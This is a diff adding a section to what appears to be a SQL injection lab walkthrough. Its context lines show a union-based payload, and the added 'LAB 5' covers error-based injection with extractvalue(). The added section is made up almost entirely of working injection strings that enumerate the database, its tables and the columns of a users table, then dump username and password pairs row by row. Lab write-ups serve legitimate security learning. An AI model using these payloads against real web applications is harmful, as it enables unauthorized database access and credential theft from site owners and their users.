@@ -45,4 +45,17 @@ Same as the first one with the addition of a bracket
 This is a double quote query
 
 `?id=-1") union select 1,group_concat(username),group_concat(password) from users--+` breaks the code
+### LAB 5
+In this even if we change the id the webpage does not change in any manner. 
+So here we use extractvalue()
+1) We get the name of the database by 
+   `?id=1' and extractvalue(0x0a,concat(0x0a,(select database())))--+`
+2) We then get the table names by
+    `?id=1' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 3,1)))--+`
+3) Then we can view columns in users table by
+   `?id=1'  and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1)))--+`
+   `?id=1'  and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1)))--+`
+5)  Then we can dump the data by iterating over the values by
+   `?id=1' and extractvalue(0x0a,concat(0x0a,(select concat(username,':',password) from users limit 0,1)))--+`
+
  
